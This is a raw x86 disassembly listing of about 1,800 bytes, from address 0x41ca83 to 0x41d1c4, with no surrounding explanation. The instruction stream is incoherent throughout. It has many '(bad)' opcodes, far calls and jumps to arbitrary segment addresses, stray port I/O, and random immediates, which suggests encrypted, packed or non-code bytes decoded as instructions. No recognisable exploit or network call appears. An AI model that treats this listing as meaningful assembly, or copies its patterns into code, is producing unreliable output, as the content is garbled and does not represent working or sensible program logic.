  41ca83:	sbb    DWORD PTR [eax],edi
  41ca85:	frstor [edi+ebx*8-0x49]
  41ca89:	push   es
  41ca8a:	unpcklps xmm3,XMMWORD PTR [ecx]
  41ca8d:	fstp   DWORD PTR [edx+eax*2]
  41ca90:	call   0xd1c3:0x7776a606
  41ca97:	inc    esp
  41ca98:	pop    ss
  41ca99:	inc    edi
  41ca9a:	jne    0x41ca6a
  41ca9c:	inc    ebp
  41ca9d:	or     eax,0xd714c38c
  41caa2:	jns    0x41caf4
  41caa4:	cli    
  41caa5:	aam    0xcb
  41caa7:	fs in  eax,0x77
  41caaa:	(bad)  
  41caab:	xchg   edx,eax
  41caac:	mov    ds,WORD PTR [ebx-0x2e]
  41caaf:	dec    eax
  41cab0:	mov    ds:0xb63d7f88,eax
  41cab5:	dec    esp
  41cab6:	and    esi,esp
  41cab8:	push   esi
  41cab9:	pop    es
  41caba:	cmp    ah,BYTE PTR [edi+0x3]
  41cabd:	test   eax,0xf1952946
  41cac2:	xchg   ecx,eax
  41cac3:	mov    esi,0x589771a
  41cac8:	pop    edi
  41cac9:	inc    ebp
  41caca:	mov    eax,0x19899657
  41cacf:	jns    0x41cb3c
  41cad1:	loopne 0x41ca99
  41cad3:	xchg   esp,eax
  41cad4:	fist   WORD PTR [esi-0x1dfb49cf]
  41cada:	outs   dx,BYTE PTR ds:[esi]
  41cadb:	or     DWORD PTR [eax+0x311de4e5],edx
  41cae1:	mov    ah,0x21
  41cae3:	not    DWORD PTR [esi]
  41cae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cae6:	dec    eax
  41cae7:	dec    ecx
  41cae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cae9:	(bad)  
  41caea:	in     eax,0x92
  41caec:	mov    edx,DWORD PTR [esi-0x581ab413]
  41caf2:	clc    
  41caf3:	mov    bh,0x24
  41caf5:	inc    ebx
  41caf6:	mov    edi,0x8588077d
  41cafb:	adc    DWORD PTR [ebx],edx
  41cafd:	shr    ch,0x27
  41cb00:	xchg   esi,eax
  41cb01:	add    BYTE PTR [ebx+0x53],bl
  41cb04:	scas   eax,DWORD PTR es:[edi]
  41cb05:	sbb    edx,DWORD PTR [esi]
  41cb07:	xchg   DWORD PTR [esi],eax
  41cb09:	push   ebp
  41cb0a:	out    0x7d,eax
  41cb0c:	inc    eax
  41cb0d:	pop    esi
  41cb0e:	and    BYTE PTR [ecx-0x4668af75],dh
  41cb14:	lock jbe 0x41caaf
  41cb17:	call   edi
  41cb19:	lods   eax,DWORD PTR ds:[esi]
  41cb1a:	jecxz  0x41cb4e
  41cb1c:	mov    bh,0x27
  41cb1e:	retf   
  41cb1f:	mov    edi,0xd7b881f1
  41cb24:	fcmovnb st,st(1)
  41cb26:	das    
  41cb27:	loop   0x41cb7a
  41cb29:	xlat   BYTE PTR ds:[ebx]
  41cb2a:	lods   al,BYTE PTR ds:[esi]
  41cb2b:	loop   0x41cad9
  41cb2d:	mov    bl,0xa
  41cb2f:	pop    ebp
  41cb30:	call   0xa6204330
  41cb35:	dec    eax
  41cb36:	mov    cl,0xa1
  41cb38:	or     DWORD PTR [edx+edi*1+0x0],ebx
  41cb3c:	ss mov bl,0xce
  41cb3f:	ja     0x41cbc0
  41cb41:	inc    edx
  41cb42:	lock inc edx
  41cb44:	scas   al,BYTE PTR es:[edi]
  41cb45:	popf   
  41cb46:	sbb    eax,0x71fe76e1
  41cb4b:	mov    ah,0xb
  41cb4d:	mov    cl,0x7e
  41cb4f:	push   es
  41cb50:	test   al,0xae
  41cb52:	sbb    al,0x34
  41cb54:	adc    al,0xd1
  41cb56:	(bad)  
  41cb57:	(bad)  [eax+0x61]
  41cb5a:	dec    edi
  41cb5b:	mov    al,ds:0xb2dbaa3e
  41cb60:	test   al,0xfd
  41cb62:	inc    ecx
  41cb63:	retf   0x3fd8
  41cb66:	push   edx
  41cb67:	pop    ebp
  41cb68:	cmp    ebp,0xffffffaf
  41cb6b:	into   
  41cb6c:	mov    edx,0x3feca07a
  41cb71:	sub    edx,DWORD PTR [ebp+0x30]
  41cb74:	mov    esi,0x797cd5ea
  41cb79:	sbb    BYTE PTR [edi],0x59
  41cb7c:	jnp    0x41cb71
  41cb7e:	lods   eax,DWORD PTR ds:[esi]
  41cb7f:	adc    BYTE PTR [eax+0x34],dh
  41cb82:	dec    esp
  41cb83:	arpl   bp,dx
  41cb85:	sahf   
  41cb86:	mov    eax,0xec3ddee7
  41cb8b:	pop    edx
  41cb8c:	lods   al,BYTE PTR ds:[esi]
  41cb8d:	dec    ecx
  41cb8e:	lods   al,BYTE PTR ds:[esi]
  41cb8f:	cmp    BYTE PTR [esi+edi*4],ah
  41cb92:	rcl    DWORD PTR [ecx],cl
  41cb94:	call   0x715a:0x6abb9f77
  41cb9b:	push   es
  41cb9c:	test   BYTE PTR [edi],0x24
  41cb9f:	sub    ecx,ebx
  41cba1:	add    eax,DWORD PTR [ebp-0x636fcdfe]
  41cba7:	adc    BYTE PTR [esi-0x28],dl
  41cbaa:	data16 jg 0x41cbb7
  41cbad:	push   ss
  41cbae:	repnz aad 0x5f
  41cbb1:	xor    BYTE PTR [ecx-0x50],ch
  41cbb4:	dec    bx
  41cbb6:	and    cl,bl
  41cbb8:	ins    DWORD PTR es:[edi],dx
  41cbb9:	in     al,dx
  41cbba:	dec    ebp
  41cbbb:	inc    edi
  41cbbc:	dec    ecx
  41cbbd:	push   ebx
  41cbbe:	test   al,0x50
  41cbc0:	sub    eax,0xb2cdaa8f
  41cbc5:	scas   al,BYTE PTR es:[edi]
  41cbc6:	dec    esp
  41cbc7:	xchg   edx,eax
  41cbc8:	mov    ds:0x6e825c92,al
  41cbcd:	adc    dl,ah
  41cbcf:	(bad)  
  41cbd0:	mov    bl,0x38
  41cbd2:	call   0xabb4:0xbb802f9a
  41cbd9:	imul   edx,ecx,0xfec6957a
  41cbdf:	sbb    DWORD PTR [edx+0x1939bf5b],ebx
  41cbe5:	push   esi
  41cbe6:	lock mov esp,0xa4640c11
  41cbec:	and    DWORD PTR ds:0x9f466c81,eax
  41cbf2:	adc    edi,DWORD PTR [edx-0x76e561b3]
  41cbf8:	les    esi,FWORD PTR [edi+0x5617792a]
  41cbfe:	inc    edi
  41cbff:	cld    
  41cc00:	aaa    
  41cc01:	loop   0x41cba5
  41cc03:	push   eax
  41cc04:	bound  edx,QWORD PTR [edi-0x7734250f]
  41cc0a:	add    al,0xac
  41cc0c:	jne    0x41cc52
  41cc0e:	sbb    bh,BYTE PTR [eax]
  41cc10:	(bad)
  41cc15:	call   0xc5a0e946
  41cc1a:	rol    BYTE PTR [eax+0x6d],0xa2
  41cc1e:	jg     0x41cc1f
  41cc20:	adc    DWORD PTR [edx-0x71cfb4f6],ebp
  41cc26:	enter  0xe147,0x42
  41cc2a:	pusha  
  41cc2b:	inc    esp
  41cc2c:	jle    0x41cc49
  41cc2e:	inc    ebp
  41cc2f:	mov    cl,0xf8
  41cc31:	and    ebp,DWORD PTR [ebx+0x2a]
  41cc34:	jns    0x41cc38
  41cc36:	dec    edx
  41cc37:	lahf   
  41cc38:	pushf  
  41cc39:	cmp    al,BYTE PTR [eax]
  41cc3b:	cmc    
  41cc3c:	rcr    al,1
  41cc3e:	mov    dh,0x67
  41cc40:	mov    eax,0x371f82a9
  41cc45:	sbb    BYTE PTR ds:0x1b55654c,dl
  41cc4b:	pop    edi
  41cc4c:	jecxz  0x41cccd
  41cc4e:	sub    edi,DWORD PTR [eax-0x22]
  41cc51:	inc    esp
  41cc52:	addr16 sbb eax,0x394c9a20
  41cc58:	mov    ds:0x113b57c,al
  41cc5d:	repz fyl2xp1 
  41cc60:	jl     0x41cca4
  41cc62:	mov    ebx,0x2aebc367
  41cc67:	dec    ebp
  41cc68:	jb     0x41ccd0
  41cc6a:	(bad)  
  41cc6b:	jmp    0xb26b:0x534ace51
  41cc72:	mov    ch,0x13
  41cc74:	or     DWORD PTR [esi],eax
  41cc76:	retf   0x7369
  41cc79:	add    BYTE PTR [edx-0x25c4790f],bh
  41cc7f:	in     al,dx
  41cc80:	cs aad 0xa0
  41cc83:	out    0x96,al
  41cc85:	or     cl,BYTE PTR [edx]
  41cc87:	iret   
  41cc88:	lock dec edx
  41cc8a:	nop
  41cc8b:	dec    sp
  41cc8d:	in     al,0xd3
  41cc8f:	mov    eax,ds:0xd6a7f1a5
  41cc94:	inc    ebp
  41cc95:	xor    DWORD PTR ds:0x5d556f45,esp
  41cc9b:	mov    ds:0xbe6b7863,eax
  41cca0:	cmp    DWORD PTR [ecx+0x7784fd4f],0x6d498564
  41ccaa:	xchg   edx,eax
  41ccab:	mov    ch,BYTE PTR [edi-0x51b81651]
  41ccb1:	mov    ebx,eax
  41ccb3:	test   al,0x94
  41ccb5:	xor    edi,esp
  41ccb7:	sbb    al,0xcb
  41ccb9:	fucom  st(4)
  41ccbb:	retf   
  41ccbc:	sti    
  41ccbd:	inc    ecx
  41ccbe:	add    ecx,ebx
  41ccc0:	or     eax,0x77a65372
  41ccc5:	dec    ebx
  41ccc6:	cld    
  41ccc7:	jmp    0xa7fcb9c1
  41cccc:	jnp    0x41cd21
  41ccce:	add    BYTE PTR [edx-0x49],dh
  41ccd1:	pushf  
  41ccd2:	scas   eax,DWORD PTR es:[edi]
  41ccd3:	test   eax,0x91f1aac
  41ccd8:	div    ebp
  41ccda:	pop    ecx
  41ccdb:	mov    dl,BYTE PTR [edi-0x36]
  41ccde:	mov    ah,0xd9
  41cce0:	xor    DWORD PTR [eax+0x5c70095a],edx
  41cce6:	mov    eax,0xccd03a9
  41cceb:	add    dh,0x32
  41ccee:	nop
  41ccef:	daa    
  41ccf0:	xadd   BYTE PTR [esi+ebx*1+0x6],al
  41ccf5:	not    BYTE PTR [ebx+0x6a]
  41ccf8:	xor    BYTE PTR [ebx+0x2014bacf],dh
  41ccfe:	jl     0x41ccd6
  41cd00:	inc    ebp
  41cd01:	xchg   esi,eax
  41cd02:	and    al,0xe7
  41cd04:	add    BYTE PTR [edx],ch
  41cd06:	mov    cl,0xc1
  41cd08:	sub    DWORD PTR [edx-0x5f],ebp
  41cd0b:	mov    ds:0x7acb899b,eax
  41cd10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd11:	xchg   edx,eax
  41cd12:	iret   
  41cd13:	lds    edx,FWORD PTR [edi+ebp*8+0x70]
  41cd17:	mov    bh,0xfc
  41cd19:	inc    eax
  41cd1a:	jg     0x41cd7e
  41cd1c:	and    edi,DWORD PTR [edx+ecx*2+0x63]
  41cd20:	sti    
  41cd21:	std    
  41cd22:	mov    bl,0x96
  41cd24:	lods   al,BYTE PTR ds:[esi]
  41cd25:	test   DWORD PTR [edi+ebx*2],esp
  41cd28:	into   
  41cd29:	jmp    0x3ed:0xf163d2a7
  41cd30:	mov    bh,0xd9
  41cd32:	mov    bl,0xd4
  41cd34:	add    ebx,ebx
  41cd36:	or     DWORD PTR [ecx],esp
  41cd38:	retf   0x72f4
  41cd3b:	in     eax,dx
  41cd3c:	adc    DWORD PTR [edx+0x42],eax
  41cd3f:	cwde   
  41cd40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd41:	fs pushf 
  41cd43:	jmp    0xe22e:0x60209703
  41cd4a:	aas    
  41cd4b:	scas   al,BYTE PTR es:[edi]
  41cd4c:	loope  0x41cd10
  41cd4e:	mov    al,ds:0x6d7c3b1e
  41cd53:	jecxz  0x41cd2e
  41cd55:	outs   dx,BYTE PTR ds:[esi]
  41cd56:	sbb    DWORD PTR [ecx],0x6a
  41cd59:	out    0x43,eax
  41cd5b:	mov    dl,BYTE PTR [ebx+esi*4+0xa]
  41cd5f:	dec    ebx
  41cd60:	stos   DWORD PTR es:[edi],eax
  41cd61:	inc    eax
  41cd62:	mov    cl,0x64
  41cd64:	pop    ds
  41cd65:	lea    edx,[edi]
  41cd67:	fs sbb al,0x47
  41cd6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd6b:	xor    esi,DWORD PTR [eax+0x5b]
  41cd6e:	sub    al,ah
  41cd70:	(bad)  
  41cd71:	addr16 jb 0x41cd0b
  41cd74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd75:	clc    
  41cd76:	into   
  41cd77:	cmp    bh,BYTE PTR [edx-0x6e864929]
  41cd7d:	scas   eax,DWORD PTR es:[edi]
  41cd7e:	jnp    0x41cd85
  41cd80:	popa   
  41cd81:	das    
  41cd82:	mov    eax,ds:0x71257e24
  41cd87:	rol    BYTE PTR [edx+0x17],1
  41cd8a:	xor    DWORD PTR [eax],eax
  41cd8c:	in     eax,0xc5
  41cd8e:	aas    
  41cd8f:	fsubr  DWORD PTR [edx-0x1f5a20fc]
  41cd95:	lahf   
  41cd96:	dec    ebp
  41cd97:	push   esp
  41cd98:	mov    edx,0xea66cb95
  41cd9d:	mov    DWORD PTR [ecx+0x1b54ba52],esp
  41cda3:	cmp    al,0xdc
  41cda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda6:	lods   eax,DWORD PTR ds:[esi]
  41cda7:	mov    esi,0x40b42182
  41cdac:	mov    dh,0xf1
  41cdae:	loop   0x41ce26
  41cdb0:	and    eax,0xb0262303
  41cdb5:	out    0x4e,al
  41cdb7:	push   eax
  41cdb8:	cmp    ebx,ebx
  41cdba:	xlat   BYTE PTR ds:[ebx]
  41cdbb:	test   al,0x1b
  41cdbd:	stc    
  41cdbe:	imul   esp,DWORD PTR [ebp-0x6e],0xcb36065f
  41cdc5:	and    eax,DWORD PTR [esi+ebx*4-0x36]
  41cdc9:	mov    eax,ds:0xcd7ff8f
  41cdce:	mov    ds:0x80dc1326,al
  41cdd3:	push   es
  41cdd4:	ins    DWORD PTR es:[edi],dx
  41cdd5:	shl    BYTE PTR [ebx],0x8
  41cdd8:	in     al,dx
  41cdd9:	push   ss
  41cdda:	pop    eax
  41cddb:	test   al,0xb8
  41cddd:	adc    eax,0x5ebc2228
  41cde2:	jle    0x41cd67
  41cde4:	and    ebx,DWORD PTR [esi+ebx*2-0x6a7bb14c]
  41cdeb:	jnp    0x41cdda
  41cded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdee:	pop    esi
  41cdef:	cmp    edx,DWORD PTR [eax-0x5cc2bf68]
  41cdf5:	jecxz  0x41cd86
  41cdf7:	adc    dl,BYTE PTR [esi*8-0x2eccca15]
  41cdfe:	aas    
  41cdff:	cdq    
  41ce00:	xchg   edi,eax
  41ce01:	push   edi
  41ce02:	int    0xdd
  41ce04:	add    DWORD PTR ds:0x3ad6877a,ebx
  41ce0a:	add    al,0xd7
  41ce0c:	pusha  
  41ce0d:	mov    ebp,0x6ddcf618
  41ce12:	cld    
  41ce13:	fisubr DWORD PTR [ebp+esi*8+0x13]
  41ce17:	je     0x41ce91
  41ce19:	xlat   BYTE PTR ds:[ebx]
  41ce1a:	cwde   
  41ce1b:	repz add ah,al
  41ce1e:	pop    ds
  41ce1f:	jbe    0x41cdc9
  41ce21:	jbe    0x41cdda
  41ce23:	sar    al,cl
  41ce25:	imul   esp,eax,0x36
  41ce28:	cmp    al,0x30
  41ce2a:	mov    al,0x57
  41ce2c:	adc    bl,ah
  41ce2e:	xchg   esi,eax
  41ce2f:	retf   0x89e5
  41ce32:	or     BYTE PTR [ecx-0x6e85424b],bh
  41ce38:	call   0x4c15:0x7665c6b2
  41ce3f:	rcl    BYTE PTR [ecx],cl
  41ce41:	pop    edi
  41ce42:	pop    edi
  41ce43:	inc    edx
  41ce44:	jle    0x41ce53
  41ce46:	(bad)  
  41ce47:	repz popa 
  41ce49:	mov    eax,0x16f09b16
  41ce4e:	leave  
  41ce4f:	fcomp  DWORD PTR [ebx]
  41ce51:	and    ebx,DWORD PTR gs:[esi+eax*1-0x16]
  41ce56:	push   es
  41ce57:	dec    esp
  41ce58:	or     DWORD PTR [esi],ecx
  41ce5a:	sub    BYTE PTR [ecx+0x3cc07f81],bh
  41ce60:	imul   eax,DWORD PTR [ecx+ebx*8-0x3a],0x5b9a90b1
  41ce68:	gs push edx
  41ce6a:	enter  0xd93c,0x38
  41ce6e:	adc    dl,BYTE PTR [edx+0x156e269a]
  41ce74:	stos   DWORD PTR es:[edi],eax
  41ce75:	push   cs
  41ce76:	dec    eax
  41ce77:	je     0x41ce3e
  41ce79:	pop    ebx
  41ce7a:	push   edx
  41ce7b:	dec    edi
  41ce7c:	mov    esi,0x99458b8d
  41ce81:	inc    ecx
  41ce82:	loop   0x41ce77
  41ce84:	push   edx
  41ce85:	and    eax,0x98d8dc39
  41ce8a:	dec    ebx
  41ce8b:	xchg   edx,eax
  41ce8c:	mov    eax,0x97039cb1
  41ce91:	pop    es
  41ce92:	push   ecx
  41ce93:	inc    ecx
  41ce94:	test   bh,0xa9
  41ce97:	(bad)  
  41ce98:	push   ds
  41ce99:	cmp    eax,0x1bcfd19a
  41ce9e:	loope  0x41ce3b
  41cea0:	mov    ebx,0x5319caf0
  41cea5:	ret    
  41cea6:	(bad)  
  41cea7:	sub    eax,DWORD PTR [edi-0x4d156b7e]
  41cead:	push   ebx
  41ceae:	xchg   DWORD PTR ds:0xb4a93cfa,ecx
  41ceb4:	fsub   st,st(2)
  41ceb6:	pop    es
  41ceb7:	adc    edi,edi
  41ceb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceba:	jle    0x41cf16
  41cebc:	push   cs
  41cebd:	std    
  41cebe:	sar    DWORD PTR [eax],0xe8
  41cec1:	pop    esp
  41cec2:	cmp    al,0xfd
  41cec4:	add    DWORD PTR [ebx+0x51150a8f],ebp
  41ceca:	and    ebp,DWORD PTR [ebx]
  41cecc:	lock int 0x3
  41cecf:	(bad)  [eax+0x64031aba]
  41ced5:	sahf   
  41ced6:	mov    ah,0xb0
  41ced8:	enter  0x6d73,0xb2
  41cedc:	pop    ss
  41cedd:	dec    ecx
  41cede:	dec    edi
  41cedf:	popa   
  41cee0:	pop    ecx
  41cee1:	sbb    ebp,edx
  41cee3:	mov    esp,0x1f316125
  41cee8:	or     eax,0x47977e1f
  41ceed:	xor    DWORD PTR [edi-0x2d],edi
  41cef0:	ins    BYTE PTR es:[edi],dx
  41cef1:	adc    esp,ecx
  41cef3:	dec    ebp
  41cef4:	push   esi
  41cef5:	repz push cs
  41cef7:	stos   DWORD PTR es:[edi],eax
  41cef8:	sbb    eax,0x717f1fc6
  41cefd:	idiv   BYTE PTR [esi+0x16e862e6]
  41cf03:	jge    0x41cec7
  41cf05:	popf   
  41cf06:	daa    
  41cf07:	jbe    0x41ced2
  41cf09:	jmp    0x37c3:0x9526ce8c
  41cf10:	popf   
  41cf11:	out    dx,al
  41cf12:	mov    ds:0x1778a2eb,al
  41cf17:	jbe    0x41cec5
  41cf19:	imul   esi,DWORD PTR [edx-0x20a49306],0x1f
  41cf20:	mov    esi,0xbda6786
  41cf25:	(bad)  [edi-0x43071b30]
  41cf2b:	xor    ecx,esp
  41cf2d:	inc    ebp
  41cf2e:	mov    al,0x34
  41cf30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf31:	lock outs dx,DWORD PTR ds:[esi]
  41cf33:	aam    0x18
  41cf35:	adc    al,al
  41cf37:	aaa    
  41cf38:	mov    ebp,0xcaba9308
  41cf3d:	cmp    bh,BYTE PTR [esi]
  41cf3f:	mov    bh,0x96
  41cf41:	mov    dl,BYTE PTR [edi-0x32f77620]
  41cf47:	inc    eax
  41cf48:	(bad)  
  41cf49:	adc    BYTE PTR [esi-0x39],cl
  41cf4c:	popa   
  41cf4d:	scas   al,BYTE PTR es:[edi]
  41cf4e:	sub    al,0x51
  41cf50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf51:	mov    fs,WORD PTR [edi]
  41cf53:	iret   
  41cf54:	int    0x2f
  41cf56:	inc    ebp
  41cf57:	dec    edx
  41cf59:	pusha  
  41cf5a:	hlt    
  41cf5b:	ds lahf 
  41cf5d:	adc    bl,BYTE PTR [eax+0x6e909bcf]
  41cf63:	test   al,0x63
  41cf65:	sub    edx,edi
  41cf67:	mov    ah,0x9b
  41cf69:	stos   BYTE PTR es:[edi],al
  41cf6a:	in     al,dx
  41cf6b:	std    
  41cf6c:	arpl   cx,di
  41cf6e:	(bad)  
  41cf6f:	test   DWORD PTR [ebx-0x6b],0x549aac7d
  41cf76:	dec    ecx
  41cf77:	and    al,0xb8
  41cf79:	ins    BYTE PTR es:[edi],dx
  41cf7a:	loope  0x41cf20
  41cf7c:	add    dl,BYTE PTR [eax]
  41cf7e:	xchg   ebx,eax
  41cf7f:	rcr    DWORD PTR [edi],0xf1
  41cf82:	xor    al,0xae
  41cf84:	mov    dl,0x45
  41cf86:	loope  0x41cfd3
  41cf88:	test   BYTE PTR cs:[ebp+0x2bba2acf],bl
  41cf8f:	cmp    ah,BYTE PTR [edi+eiz*4+0x7a5c430f]
  41cf96:	out    dx,eax
  41cf97:	push   esp
  41cf98:	pushf  
  41cf99:	cli    
  41cf9a:	inc    esi
  41cf9b:	cmp    eax,0xa8874a75
  41cfa0:	adc    al,0x4e
  41cfa2:	xchg   ebp,eax
  41cfa3:	gs inc esi
  41cfa5:	sbb    al,BYTE PTR [ebx-0x4232f961]
  41cfab:	stc    
  41cfac:	sbb    ch,bl
  41cfae:	nop
  41cfaf:	gs leave 
  41cfb1:	push   ecx
  41cfb2:	jmp    0x34b911a2
  41cfb7:	push   0x85772b4f
  41cfbc:	mov    ss,edx
  41cfbe:	add    BYTE PTR [ebp+0xf],al
  41cfc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfc2:	mov    DWORD PTR [edi+0x8d5e480],ecx
  41cfc8:	push   0x1195b4d8
  41cfcd:	mov    ds:0x74f9ddf0,eax
  41cfd2:	dec    esp
  41cfd3:	inc    ebx
  41cfd5:	es pushf 
  41cfd7:	das    
  41cfd8:	mov    dh,0x9c
  41cfda:	pop    ebp
  41cfdb:	inc    esp
  41cfdc:	sbb    BYTE PTR [edx+0x5ce197e9],cl
  41cfe2:	clc    
  41cfe3:	lds    ecx,FWORD PTR [ecx+0x11]
  41cfe6:	pop    ds
  41cfe7:	arpl   WORD PTR [edi-0x6e873c65],cx
  41cfed:	pop    ds
  41cfee:	mov    esi,0x54705567
  41cff3:	bound  di,DWORD PTR ss:0xb7fde675
  41cffb:	(bad)  
  41cffc:	ins    BYTE PTR es:[edi],dx
  41cffd:	inc    ebx
  41cffe:	out    0xd6,eax
  41d000:	test   al,0x84
  41d002:	or     ah,BYTE PTR [eax-0x7eefb3a1]
  41d008:	lods   eax,DWORD PTR ds:[esi]
  41d009:	fmul   DWORD PTR [ebp+0x12f4b0a9]
  41d00f:	mov    ?,WORD PTR [edx+0x45de9078]
  41d015:	mov    eax,0x4596f261
  41d01a:	mov    al,ds:0xd045a950
  41d01f:	in     al,dx
  41d020:	push   esp
  41d021:	jbe    0x41cfc5
  41d023:	adc    bh,ah
  41d025:	popf   
  41d026:	jmp    0x8c2d:0x8913a0c5
  41d02d:	mov    WORD PTR [ebx-0x35],cs
  41d030:	mov    ah,0x2a
  41d032:	dec    ecx
  41d033:	cmp    ch,BYTE PTR [edi]
  41d035:	les    ebp,FWORD PTR es:[ecx-0x59]
  41d039:	sub    ah,BYTE PTR [ebp-0x3ea7ae5f]
  41d03f:	stos   DWORD PTR es:[edi],eax
  41d040:	push   0x26
  41d042:	cwde   
  41d043:	sbb    DWORD PTR [ebp+0x1],esi
  41d046:	jmp    0x605e:0x7970ac5e
  41d04d:	jbe    0x41d0b7
  41d04f:	cmp    DWORD PTR [ebx+0x29e0b9bb],0x94aa5c0
  41d059:	fstp   QWORD PTR [edx]
  41d05b:	mov    edi,0x5b9ef728
  41d060:	xchg   ebx,eax
  41d061:	fwait
  41d062:	mov    esi,0x8b885e1c
  41d067:	add    BYTE PTR [esi+ebp*8+0x74],ah
  41d06b:	xchg   edx,eax
  41d06c:	sub    eax,0x2a7682a8
  41d071:	jmp    0x41d026
  41d073:	push   edi
  41d074:	and    bl,bh
  41d076:	ja     0x41d05c
  41d078:	sub    ch,ah
  41d07a:	cli    
  41d07b:	sbb    BYTE PTR [ecx+0x1c95a0c8],dl
  41d081:	scas   al,BYTE PTR es:[edi]
  41d082:	push   0x55
  41d084:	adc    ch,ah
  41d086:	pop    eax
  41d087:	lods   eax,DWORD PTR ds:[esi]
  41d088:	fild   WORD PTR [ebx+ecx*2]
  41d08b:	mov    DWORD PTR [edi],ecx
  41d08d:	pop    es
  41d08e:	mov    ds:0x3a379214,al
  41d093:	daa    
  41d094:	imul   ecx,DWORD PTR [eax],0x9f3742ec
  41d09a:	sahf   
  41d09b:	sbb    ch,bh
  41d09d:	icebp  
  41d09e:	mov    esi,0xe8eb9fbe
  41d0a3:	ror    BYTE PTR [ebp+0x271231ab],1
  41d0a9:	das    
  41d0aa:	cmp    al,0xa9
  41d0ac:	popf   
  41d0ad:	repnz mov fs,WORD PTR [esi-0x6a]
  41d0b1:	mov    ebp,0x708c8625
  41d0b6:	cmp    eax,0x42f19c06
  41d0bb:	xlat   BYTE PTR ds:[ebx]
  41d0bc:	jb     0x41d063
  41d0be:	sbb    ah,BYTE PTR ds:0x61a95252
  41d0c4:	je     0x41d13c
  41d0c6:	in     al,0xfd
  41d0c8:	xor    DWORD PTR [ebx],ebx
  41d0ca:	(bad)  
  41d0cb:	mov    ebp,0x509e1b22
  41d0d0:	lods   al,BYTE PTR ds:[esi]
  41d0d1:	call   0x6ea13cb0
  41d0d6:	call   DWORD PTR [eax]
  41d0d8:	test   BYTE PTR [edx-0x529ff418],cl
  41d0de:	adc    BYTE PTR [ecx],ch
  41d0e0:	pop    ds
  41d0e1:	shr    BYTE PTR gs:[eax+0x41],1
  41d0e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e6:	popf   
  41d0e7:	fs cs mov bl,0xe9
  41d0eb:	pop    edi
  41d0ec:	and    BYTE PTR [esi-0xf75fa1b],ch
  41d0f2:	adc    eax,0x7a54969d
  41d0f7:	inc    ebp
  41d0f8:	mov    ebp,DWORD PTR [eax]
  41d0fa:	dec    ebx
  41d0fb:	dec    edi
  41d0fc:	mov    cl,0x6f
  41d0fe:	mov    bl,0x83
  41d100:	xor    al,0x1f
  41d102:	(bad)  
  41d103:	out    dx,eax
  41d104:	jne    0x41d157
  41d106:	scas   eax,DWORD PTR es:[edi]
  41d107:	int3   
  41d108:	mov    bh,0x51
  41d10a:	xor    BYTE PTR [ebx],0x30
  41d10d:	into   
  41d10e:	hlt    
  41d10f:	mov    ds:0x40468630,eax
  41d114:	lods   al,BYTE PTR ds:[esi]
  41d115:	adc    edx,ebx
  41d117:	(bad)  
  41d118:	jecxz  0x41d0cd
  41d11a:	xchg   BYTE PTR [ecx],dl
  41d11c:	(bad)  
  41d11d:	(bad)  
  41d11e:	inc    edi
  41d11f:	rol    DWORD PTR [ebp-0x53],0x6b
  41d123:	pop    esp
  41d124:	push   es
  41d125:	clc    
  41d126:	sar    BYTE PTR [eax+ebp*8+0x35],1
  41d12a:	stc    
  41d12b:	adc    eax,0xc7ab314
  41d130:	cmp    bl,dl
  41d132:	mov    ecx,0x981d1ca1
  41d137:	aas    
  41d138:	pop    eax
  41d139:	push   esi
  41d13a:	pop    ds
  41d13b:	dec    edx
  41d13c:	std    
  41d13d:	aad    0x8d
  41d13f:	add    al,0x38
  41d141:	and    dl,BYTE PTR ds:0x1c6612b2
  41d147:	xchg   ebp,eax
  41d148:	xchg   ebp,eax
  41d149:	dec    edi
  41d14a:	lea    eax,[eax+0x6acef140]
  41d150:	leave  
  41d151:	sbb    BYTE PTR [edx+0x1e6fb2fa],al
  41d157:	mov    DWORD PTR [edi],ebx
  41d159:	daa    
  41d15a:	(bad)  
  41d15c:	or     bl,BYTE PTR [edx+0x7a]
  41d15f:	cmp    dh,0x4c
  41d162:	ja     0x41d12d
  41d164:	nop
  41d165:	jle    0x41d1e3
  41d167:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d169:	(bad)  
  41d16b:	fidivr WORD PTR [esi+0x5c]
  41d16e:	mov    eax,0x504a724d
  41d173:	inc    ebp
  41d174:	loop   0x41d1e1
  41d176:	push   edx
  41d177:	inc    edi
  41d178:	push   edi
  41d179:	mov    cs,WORD PTR [ebx]
  41d17b:	daa    
  41d17c:	jle    0x41d1c0
  41d17e:	sbb    eax,0x6cfe642f
  41d183:	mov    esp,0x50fbdb75
  41d188:	mov    ah,0xcc
  41d18a:	data16 jne 0x41d20c
  41d18d:	push   edx
  41d18e:	cdq    
  41d18f:	icebp  
  41d190:	push   esp
  41d191:	push   edi
  41d192:	cmc    
  41d193:	add    al,0xd1
  41d195:	xchg   edx,eax
  41d196:	ror    DWORD PTR [ecx+0x5f],cl
  41d199:	xchg   ebp,eax
  41d19a:	push   ds
  41d19b:	push   esi
  41d19c:	cld    
  41d19d:	or     BYTE PTR [esi-0x62],0x4c
  41d1a1:	or     ecx,DWORD PTR [edx+esi*1]
  41d1a4:	inc    esi
  41d1a5:	cmp    BYTE PTR ds:0xa21b618f,bh
  41d1ab:	dec    edx
  41d1ac:	in     al,0x1d
  41d1ae:	cmp    esp,DWORD PTR [ecx]
  41d1b0:	mov    cl,0x40
  41d1b2:	mov    cl,0x57
  41d1b4:	cwde   
  41d1b5:	dec    ebp
  41d1b6:	ja     0x41d1bf
  41d1b8:	mov    bl,0x9d
  41d1ba:	in     al,dx
  41d1bb:	stos   BYTE PTR es:[edi],al
  41d1bc:	sbb    ebx,ebp
  41d1be:	mov    ecx,0xb404f28c
  41d1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1c4:	aas    
